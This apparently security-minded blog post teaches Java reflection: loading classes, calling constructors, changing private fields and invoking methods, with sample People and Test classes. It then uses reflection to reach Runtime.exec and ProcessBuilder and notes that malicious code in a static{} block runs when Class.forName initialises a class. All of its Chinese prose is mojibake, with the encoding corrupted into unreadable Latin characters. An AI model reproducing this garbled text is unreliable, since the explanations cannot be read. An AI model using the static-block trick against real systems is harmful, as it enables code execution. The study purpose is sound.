    <content type="html"><![CDATA[<h1 id="Javaåå°„æœºåˆ¶"><a href="#Javaåå°„æœºåˆ¶" class="headerlink" title="Javaåå°„æœºåˆ¶"></a>Javaåå°„æœºåˆ¶</h1><h2 id="åå°„æœºåˆ¶"><a href="#åå°„æœºåˆ¶" class="headerlink" title="åå°„æœºåˆ¶"></a>åå°„æœºåˆ¶</h2><p>Javaåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€æ—¶ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤Ÿè·å–åˆ°è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§ï¼ˆåŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•å’Œå±æ€§ï¼‰ã€‚</p><ol><li>Javaåå°„æœºåˆ¶çš„æ ¸å¿ƒæ˜¯å†ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åŠ è½½ç±»å¹¶è·å–ç±»çš„è¯¦ç»†ä¿¡æ¯ï¼Œä»è€Œæ“ä½œç±»æˆ–è€…å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚æœ¬è´¨æ—¶JVMå¾—åˆ°Classå¯¹è±¡è¿›è¡Œåç¼–è¯‘ï¼Œä»è€Œè·å–å¯¹è±¡çš„å„ç§ä¿¡æ¯ã€‚</li><li>Javaå±äºå…ˆç¼–è¯‘å†è¿è¡Œçš„è¯­è¨€ï¼Œç¨‹åºä¸­å¯¹è±¡çš„ç±»å‹å†ç¼–è¯‘æœŸå°±ç¡®å®šä¸‹æ¥äº†ï¼Œè€Œå½“ç¨‹åºå†è¿è¡Œæ—¶å¯èƒ½éœ€è¦åŠ¨æ€åŠ è½½æŸäº›ç±»ï¼Œè¿™äº›ç±»å› ä¸ºä¹‹å‰ç”¨ä¸åˆ°ï¼Œæ‰€ä»¥æ²¡æœ‰è¢«åŠ è½½åˆ°JVMã€‚é€šè¿‡åå°„ï¼Œå¯ä»¥å†è¿è¡Œçš„æ—¶å€™åŠ¨æ€åˆ›å»ºå¯¹è±¡å¹¶è°ƒç”¨å…¶å±æ€§ï¼Œä¸éœ€è¦æå‰å†ç¼–è¯‘æœŸå°±çŸ¥é“è¿è¡Œçš„å¯¹è±¡æ˜¯è°ã€‚</li></ol><h2 id="åå°„å¸¸ç”¨çš„ç±»"><a href="#åå°„å¸¸ç”¨çš„ç±»" class="headerlink" title="åå°„å¸¸ç”¨çš„ç±»"></a>åå°„å¸¸ç”¨çš„ç±»</h2><ul><li><code>Java.lang.Class</code>  ä»£è¡¨ç±»</li><li><code>Java.lang.reflect.Constructor</code>  ä»£è¡¨ç±»çš„æ„é€ æ–¹æ³•</li><li><code>Java.lang.reflect.Field</code>  ä»£è¡¨ç±»çš„å±æ€§</li><li><code>Java.lang.reflect.Method </code> ä»£è¡¨ç±»çš„æ–¹æ³•</li><li><code>Java.lang.reflect.Modifier </code> ä»£è¡¨ç±»ï¼Œæ–¹æ³•ï¼Œå±æ€§çš„æè¿°ä¿®é¥°ç¬¦</li></ul><h2 id="æµ‹è¯•ç»ƒä¹ "><a href="#æµ‹è¯•ç»ƒä¹ " class="headerlink" title="æµ‹è¯•ç»ƒä¹ "></a>æµ‹è¯•ç»ƒä¹ </h2><p><strong>æµ‹è¯•ç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span> </span>&#123;<br><span class="hljs-comment">//    ç§æœ‰å˜é‡</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-keyword">private</span> String addr;<br><span class="hljs-comment">//    æ„é€ å‡½æ•°</span><br>    People(String name, <span class="hljs-keyword">int</span> age, String addr)&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>        <span class="hljs-keyword">this</span>.addr = addr;<br>    &#125;<br><span class="hljs-comment">//    è®¾ç½®å‚æ•°</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAddr</span><span class="hljs-params">(String addr)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.addr = addr;<br>    &#125;<br><span class="hljs-comment">//    è·å–å˜é‡å€¼</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getAddr</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.addr;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getAll</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Name:&quot;</span> + <span class="hljs-keyword">this</span>.name);<br>        System.out.println(<span class="hljs-string">&quot;Age:&quot;</span> + <span class="hljs-keyword">this</span>.age);<br>        System.out.println(<span class="hljs-string">&quot;Addr:&quot;</span> + <span class="hljs-keyword">this</span>.addr);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>åˆ›å»ºäº†ä¸€ä¸ªç®€å•çš„æµ‹è¯•Peopleç±»</p></blockquote><p><strong>è·å–åˆ°ç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br><br>        People p1 = <span class="hljs-keyword">new</span> People(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br><br>        Class p2 = People.class;<br><br>        Class p3 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br><br>        Class p4 = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.People&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;p1:&quot;</span> + p1);<br><br>        System.out.println(<span class="hljs-string">&quot;p2:&quot;</span> + p2);<br><br>        System.out.println(<span class="hljs-string">&quot;p3:&quot;</span> + p3);<br><br>        System.out.println(<span class="hljs-string">&quot;p4:&quot;</span> + p4);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011212404093.png" alt="image-20211011212404093"></p><p>ä»¥ä¸Šå››ç§é€šè¿‡ä¸åŒçš„æ–¹å¼éƒ½æˆåŠŸåˆ›å»ºç±»Peopleç±»</p><p>ç¬¬ä¸€ç§æ–¹æ³•ç›´æ¥åˆ›å»ºå¯¹è±¡ï¼Œæ²¡æœ‰ä½¿ç”¨åå°„ï¼›ç¬¬äºŒç§æ˜¯åˆ©ç”¨ç°æœ‰ç±»è·å–ç±»ï¼›ç¬¬ä¸‰ç§æ˜¯é å†™å…¥åŒ…è·¯å¾„å‚æ•°è·å–åˆ°ç±»ï¼›ç¬¬å››ç§å°±æ˜¯åˆ©ç”¨<code>ClassLoader</code> çš„æ–¹æ³•è·å–ç±»</p><blockquote><p>ä¸Šé¢çš„æ–¹æ³•çš„åŒºåˆ«å°±æ˜¯æ˜¯å¦ä¼šå¯¹ç±»åˆå§‹åŒ–</p></blockquote><p><strong>åˆ›å»ºå®ä¾‹</strong></p><ol><li><p>ç›´æ¥ä½¿ç”¨<code>Class</code>å¯¹è±¡çš„<code>newInstance()</code>æ–¹æ³•æ¥åˆ›å»º<code>Class</code>å¯¹åº”çš„å®ä¾‹</p></li><li><p>å…ˆé€šè¿‡<code>Class</code>å¯¹è±¡è·å–æŒ‡å®šçš„<code>Constructor</code>å¯¹è±¡ï¼Œå†è°ƒç”¨<code>Constructor</code>å¯¹è±¡çš„<code>newInstance()</code>åˆ›å»ºå¯¹è±¡</p><blockquote><p>ç¬¬ä¸€ç§åªèƒ½ä½¿ç”¨é»˜è®¤çš„æ— å‚æ„é€ ï¼Œç¬¬äºŒç§å¯ä»¥æŒ‡å®šç±»æ„é€ å™¨</p></blockquote></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;<br><span class="hljs-comment">//        è·å–ç±»</span><br>        Class p1 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br><span class="hljs-comment">//        å®ä¾‹åŒ–ç±»</span><br><span class="hljs-comment">//        é»˜è®¤æ— å‚æ„é€ å™¨(éœ€è¦ç±»æœ‰æ— å‚æ„é€ å‡½æ•°)</span><br>        People people1 = (People) p1.newInstance();<br><span class="hljs-comment">//        æŒ‡å®šç±»æ„é€ å™¨</span><br>        people1.getAll();<br>        System.out.println(<span class="hljs-string">&quot;----------&quot;</span>);<br>        Constructor cons = p1.getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class, String.class);<br>        People people2 = (People) cons.newInstance(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br>        people2.getAll();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011220423307.png" alt="image-20211011220423307"></p><p><code>getConstructors()</code>ï¼šæ‰€æœ‰â€å…¬æœ‰çš„â€æ„é€ æ–¹æ³•</p><p><code>getDeclaredConstructors()</code>ï¼šè·å–æ‰€æœ‰çš„æ„é€ æ–¹æ³•(åŒ…æ‹¬ç§æœ‰ã€å—ä¿æŠ¤ã€é»˜è®¤ã€å…¬æœ‰)</p><p><strong>è·å–æˆå‘˜å±æ€§å¹¶ä¿®æ”¹</strong></p><p><code>getFileds()</code> è·å–ç±»çš„æ‰€æœ‰publicå±æ€§</p><p><code>getDeclaredFileds()</code> è·å–ç±»çš„æ‰€æœ‰publicå±æ€§</p><p><code>getFiled(String name)</code>ï¼šç‰¹å®šçš„Publicå±æ€§</p><p><code>getDeclaredFiled(String name)</code>: è·å–ç±»çš„ç‰¹å®šå±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>&#123;<br>        Class p1 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br><br>        Constructor cons = p1.getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class, String.class);<br>        People people1 = (People) cons.newInstance(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br>        people1.getAll();<br>        System.out.println(<span class="hljs-string">&quot;--------------&quot;</span>);<br>        Field[] fields = p1.getDeclaredFields();<br>        <span class="hljs-keyword">for</span>(Field f:fields)&#123;<br>            System.out.println(f);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;----------------&quot;</span>);<br>        Field field = p1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(field);<br>        System.out.println(<span class="hljs-string">&quot;------------&quot;</span>);<br><span class="hljs-comment">//        è§£é™¤ç§æœ‰å‚æ•°é™å®š</span><br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(people1, <span class="hljs-string">&quot;test&quot;</span>);<br>        people1.getAll();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011222341138.png" alt="image-20211011222341138"></p><blockquote><p>è·å–å•ä¸ªçš„ç±»æˆå‘˜å˜é‡ï¼Œä¾ç„¶ä½¿ç”¨çš„æ˜¯å‰é¢çš„æ•°æ®ç±»å‹æ˜¯Filedï¼Œä¿®æ”¹æˆå‘˜å˜é‡çš„æ—¶å€™ï¼Œä½¿ç”¨setå‡½æ•°ï¼Œå¦‚æœæ˜¯ä¿®æ”¹ç§æœ‰æˆå‘˜å˜é‡éœ€è¦å…ˆä½¿ç”¨<code>setAccessible(true)</code>å‡½æ•°ï¼Œç„¶åä½¿ç”¨ <code>set</code> å‡½æ•°æ¥è®¾ç½®å˜é‡çš„å€¼</p><p>é€šè¿‡åå°„å¯ä»¥ç›´æ¥ä¿®æ”¹ç±»çš„ç§æœ‰æˆå‘˜å˜é‡</p></blockquote><p><strong>è·å–æˆå‘˜æ–¹æ³•å¹¶è°ƒç”¨</strong></p><p><code>getMethods()</code>ï¼šè·å–æ‰€æœ‰Publicæˆå‘˜æ–¹æ³•</p><p><code>getDeclaredMethods()</code> ï¼šè·å–æ‰€æœ‰æˆå‘˜æ–¹æ³•</p><p><code>getMethod()</code> ï¼šè·å–ç‰¹å®šPublicæˆå‘˜æ–¹æ³•</p><p><code>getDeclaredMethod()</code> ï¼š è·å–ç‰¹å®šæˆå‘˜æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>&#123;<br>        Class p1 = Class.forName(<span class="hljs-string">&quot;com.People&quot;</span>);<br>        Constructor cons = p1.getDeclaredConstructor(String.class, <span class="hljs-keyword">int</span>.class, String.class);<br>        People people1 = (People) cons.newInstance(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;beijing&quot;</span>);<br>        people1.getAll();<br>        System.out.println(<span class="hljs-string">&quot;-------------&quot;</span>);<br>        Method[] methods = p1.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span>(Method m:methods)&#123;<br>            System.out.println(m);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;-------------&quot;</span>);<br>        Method method = p1.getMethod(<span class="hljs-string">&quot;setAge&quot;</span>, <span class="hljs-keyword">int</span>.class);<br>        method.invoke(people1,<span class="hljs-number">20</span>);<br>        people1.getAll();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211011224303903.png" alt="image-20211011224303903"></p><blockquote><p>è·å–å•ä¸ªç±»å‡½æ•°æ—¶ï¼Œåœ¨å…¶åé¢åŠ ä¸Š å‚æ•°ç±»å‹.class ï¼Œåé¢ä½¿ç”¨invokeè°ƒç”¨å‡½æ•°æ—¶ï¼Œå‚æ•°ä¸ºå®ä¾‹åŒ–ç±»çš„åå­—ï¼Œå’Œå‡½æ•°çš„å‚æ•°ã€‚å¦‚æœå‡½æ•°æ˜¯ç§æœ‰çš„å¯ä»¥ä½¿ç”¨<code>setAccessible(true)</code>ï¼Œè§£é™¤ç§æœ‰é™å®š</p><p>æœ€åä½¿ç”¨ <code>invoke()</code> æ¥è°ƒç”¨å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰€é€‰çš„ç±»ï¼Œåé¢çš„å‚æ•°å°±æ˜¯ç»™å‡½æ•°ä¼ çš„å‚æ•°</p><p>è¿™é‡Œæ„Ÿè§‰è¿™ä¸ªçš„ä½œç”¨å°±æ˜¯æ‹¿æ¥è°ƒç”¨ç±»ä¸­çš„ç§æœ‰æ–¹æ³•</p></blockquote><h2 id="Runtime-ç±»çš„ä½¿ç”¨"><a href="#Runtime-ç±»çš„ä½¿ç”¨" class="headerlink" title="Runtime ç±»çš„ä½¿ç”¨"></a>Runtime ç±»çš„ä½¿ç”¨</h2><blockquote><p><code>java.lang.Runtime</code> ä¸­æœ‰ä¸€ä¸ª <code>exec</code> æ–¹æ³•å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤ï¼Œæ‰€ä»¥ç»å¸¸è¢«åœ¨å„ç§<code>payload</code>ä¸­</p></blockquote><p><code>Runtime</code> ç±»çš„æ„é€ å‡½æ•°æœ‰ç‚¹ç‰¹åˆ«ï¼Œå®ƒçš„ç©ºæ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼ˆåœ¨IDEAä¸­å¯ä»¥ç›´æ¥æŒ‰ F4 æŸ¥çœ‹ç±»æºç ï¼‰</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012125858616.png" alt="image-20211012125858616"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012132531112.png" alt="image-20211012132531112"></p><p>æ‰€ä»¥å¯¹äºä¸€èˆ¬çš„æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ <code>getRuntime()</code> å‡½æ•°æ¥å®ä¾‹åŒ–è¿™ä¸ªç±»</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012132929569.png" alt="image-20211012132929569"></p><p>ä½¿ç”¨åå°„è°ƒç”¨ <code>exec()</code></p><p>ç¬¬ä¸€ç§æ–¹æ³•ï¼šè°ƒç”¨ç§æœ‰æ„é€ å‡½æ•°</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012134851725.png" alt="image-20211012134851725"></p><p>ç¬¬äºŒç§æ–¹æ³•ï¼šè°ƒç”¨ <code>getRuntime()</code> å‡½æ•°</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012135057941.png" alt="image-20211012135057941"></p><blockquote><p><code>getRuntime()</code> å‡½æ•°çš„è¿”å›ä¸€ä¸ª Runtime  ç±»</p></blockquote><h2 id="ProcessBuilderç±»ä½¿ç”¨"><a href="#ProcessBuilderç±»ä½¿ç”¨" class="headerlink" title="ProcessBuilderç±»ä½¿ç”¨"></a>ProcessBuilderç±»ä½¿ç”¨</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012154708889.png" alt="image-20211012154708889"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012154732739.png" alt="image-20211012154732739"></p><p>æ ¹æ®ç±»çš„æ„é€ æ–¹æ³•å®ä¾‹åŒ–ç±»ï¼Œé€šè¿‡<code>start()</code>æ–¹æ³•æ‰§è¡Œå‘½ä»¤å³å¯ï¼Œåªéœ€è¦ä¸€ä¸ªå‚æ•°å°±å¯ä»¥äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012155047493.png" alt="image-20211012155047493"></p><h2 id="æ·±åº¦æµ‹è¯•"><a href="#æ·±åº¦æµ‹è¯•" class="headerlink" title="æ·±åº¦æµ‹è¯•"></a>æ·±åº¦æµ‹è¯•</h2><p>æ˜¯å¦ä¼šå¯¹ç±»åˆå§‹åŒ–çš„é—®é¢˜</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012151219874.png" alt="image-20211012151219874"></p><p>åœ¨ä½¿ç”¨ <code>forname()</code> æ—¶ï¼Œæ„é€ å‡½æ•°å¹¶ä¸ä¼šæ‰§è¡Œï¼Œå³ä½¿æˆ‘ä»¬è®¾ç½® <code>initialize=true</code>ï¼Œè¿™é‡Œçš„åˆå§‹åŒ–æŒ‡çš„å°±æ˜¯ç±»çš„åˆå§‹åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrainPrint</span> </span>&#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä»£ç å—ï¼ï¼ï¼&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;é™æ€ä»£ç å—ï¼ï¼ï¼&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrainPrint</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ„é€ å‡½æ•°ï¼ï¼ï¼&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ åˆå§‹åŒ–æ–¹æ³•çš„åŒºåˆ«ï¼Œè°ƒç”¨é¡ºåºï¼Œå®‰å…¨ä¸Šçš„ä»·å€¼ï¼Ÿ</p><p>é¦–å…ˆè°ƒç”¨çš„æ˜¯ <code>static&#123;&#125;</code> å…¶æ¬¡æ˜¯ <code>&#123;&#125;</code> æœ€åæ˜¯ æ„é€ å‡½æ•°</p><p><code>static&#123;&#125;</code> æ˜¯ç±»åˆå§‹åŒ–çš„æ—¶å€™è°ƒç”¨ï¼Œ<code>&#123;&#125;</code>ä¸­çš„ä»£ç ä¼šæ”¾åœ¨æ„é€ å‡½æ•°çš„ <code>super()</code> åé¢ï¼Œåœ¨å½“å‰æ„é€ å‡½æ•°å‰é¢ï¼Œæ‰€ä»¥ <code>forName</code> ä¸­çš„ <code>initialize=true</code> å…¶å®å°±æ˜¯å‘Šè¯‰ java è™šæ‹Ÿæœºæ˜¯å¦æ‰§è¡Œç±»åˆå§‹åŒ–ã€‚</p><p>æ”»å‡»è€…ç¼–å†™ä¸€ä¸ªæ¶æ„ç±»ä»£ç æ”¾è¿› <code>static&#123;&#125;</code> ä¸­ï¼Œå°±ä¼šåœ¨æ‰§è¡Œ <code>forName()</code> æ–¹æ³•çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨</p><p>â€¦â€¦â€¦â€¦â€¦â€¦ æ›´å¤šå¾…å­¦</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Java åå°„æœºåˆ¶æ˜¯ Java åŠ¨æ€æ€§çš„é‡è¦ä½“ç°ï¼Œåˆ©ç”¨åå°„æœºåˆ¶å¯ä»¥å¯¹ Java çš„ç±»å®ç°åŠ¨æ€è°ƒç”¨ã€‚Java çš„å¤§éƒ¨åˆ†æ¡†æ¶éƒ½æ˜¯åˆ©ç”¨åå°„ç¼–å†™çš„ï¼Œåˆ©ç”¨ Java çš„åå°„åœ¨æ¼æ´åˆ©ç”¨ä¸­æœ‰é‡å¤§ä½œç”¨</p><p>å­¦ä¹ æ–‡ç« </p><p>Pç¥ä»£ç å®¡è®¡ç‰›é€¼ï¼ï¼ï¼</p><p><a href="https://m0nit0r.top/2020/06/07/java-deserialize-learn2/">https://m0nit0r.top/2020/06/07/java-deserialize-learn2/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Javaåå°„æœºåˆ¶&quot;&gt;&lt;a href=&quot;#Javaåå°„æœºåˆ¶&quot; class=&quot;headerlink&quot; title=&quot;Javaåå°„æœºåˆ¶&quot;&gt;&lt;/a&gt;Javaåå°„æœºåˆ¶&lt;/h1&gt;&lt;h2 id=&quot;åå°„æœºåˆ¶&quot;&gt;&lt;a href=&quot;#åå°„æœºåˆ¶&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="ç¼–ç¨‹è¯­è¨€" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Web" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Web/"/>
    
    
